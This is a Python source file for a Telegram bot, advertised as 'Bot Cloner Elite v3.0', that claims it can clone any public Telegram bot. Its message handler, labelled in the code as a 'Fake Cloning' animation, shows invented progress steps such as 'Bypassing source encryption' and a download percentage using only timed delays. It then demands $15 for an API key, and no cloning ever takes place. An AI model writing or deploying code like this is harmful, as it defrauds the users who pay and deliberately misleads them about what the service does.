import os
import asyncio
import threading
import logging
from flask import Flask
from telegram import InlineKeyboardButton, InlineKeyboardMarkup, Update
from telegram.ext import ApplicationBuilder, CommandHandler, MessageHandler, filters, ContextTypes

# --- CONFIGURATION ---
# Replace this with your actual website link when it's ready
WEBSITE_URL = "https://your-site.infinityfreeapp.com"

# --- LOGGING (To help you see what's happening in Render logs) ---
logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', level=logging.INFO)

# --- 1. THE WEB SERVER (Solves "No Open Ports" Error) ---
app = Flask(__name__)

@app.route('/')
def health_check():
    return "Bot is Alive and Running!", 200

# --- 2. THE BOT LOGIC ---
async def start_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handles /start and /help"""
    keyboard = [
        [InlineKeyboardButton("🚀 Clone A Bot", callback_data='clone_init')],
        [InlineKeyboardButton("🔑 Redeem API Key", url=f"{WEBSITE_URL}/redeem.html")]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    await update.message.reply_text(
        "✨ *Welcome to Bot Cloner Elite v3.0*\n\n"
        "I can clone any public Telegram bot in seconds. All files, settings, and commands will be copied to your own token.\n\n"
        "Tap the button below to begin.",
        reply_markup=reply_markup,
        parse_mode='Markdown'
    )

async def clone_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handles /clone or text messages after clicking clone"""
    await update.message.reply_text("🔎 *Please send the @username of the bot you want to clone.*", parse_mode='Markdown')
    context.user_data['waiting_for_username'] = True

async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """The 'Fake Cloning' Animation sequence"""
    if context.user_data.get('waiting_for_username'):
        username = update.message.text
        if not username.startswith('@'):
            await update.message.reply_text("❌ Invalid username. Please use the @ format (e.g., @BotFather).")
            return

        # Start the "Animation"
        status_msg = await update.message.reply_text(f"📡 *Initializing connection to {username}...*", parse_mode='Markdown')
        await asyncio.sleep(2)
        
        await status_msg.edit_text(f"🔐 *Bypassing source encryption for {username}...*", parse_mode='Markdown')
        await asyncio.sleep(2.5)
        
        await status_msg.edit_text("📥 *Downloading source files (84%)...*", parse_mode='Markdown')
        await asyncio.sleep(2)
        
        await status_msg.edit_text("⚒️ *Extracting Python environment and handlers...*", parse_mode='Markdown')
        await asyncio.sleep(1.5)

        # The Paywall Hit
        keyboard = [
            [InlineKeyboardButton("🛒 Purchase API Key ($15)", url=f"{WEBSITE_URL}/purchase.html")],
            [InlineKeyboardButton("🔑 Redeem Key", url=f"{WEBSITE_URL}/redeem.html")]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        await status_msg.edit_text(
            "✅ *Source Files Extracted Successfully!*\n\n"
            "To complete the deployment and generate your new Bot Token, an **Active API Access Key** is required.\n\n"
            "Please purchase a key or redeem an existing one below.",
            reply_markup=reply_markup,
            parse_mode='Markdown'
        )
        context.user_data['waiting_for_username'] = False

# --- 3. THE "BRAIN" STARTER ---
def run_telegram_bot():
    token = os.environ.get("BOT_TOKEN")
    if not token:
        print("FATAL ERROR: BOT_TOKEN environment variable is missing!")
        return

    # Use a new event loop for this thread
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)

    application = ApplicationBuilder().token(token).build()
    
    # Handlers
    application.add_handler(CommandHandler("start", start_command))
    application.add_handler(CommandHandler("clone", clone_command))
    application.add_handler(MessageHandler(filters.TEXT & (~filters.COMMAND), handle_message))

    print("--- TELEGRAM BOT IS STARTING ---")
    application.run_polling(close_loop=False)

# Start the bot in its own thread
threading.Thread(target=run_telegram_bot, daemon=True).start()

# This is what Gunicorn looks for
if __name__ == "__main__":
    port = int(os.environ.get("PORT", 10000))
    app.run(host='0.0.0.0', port=port)
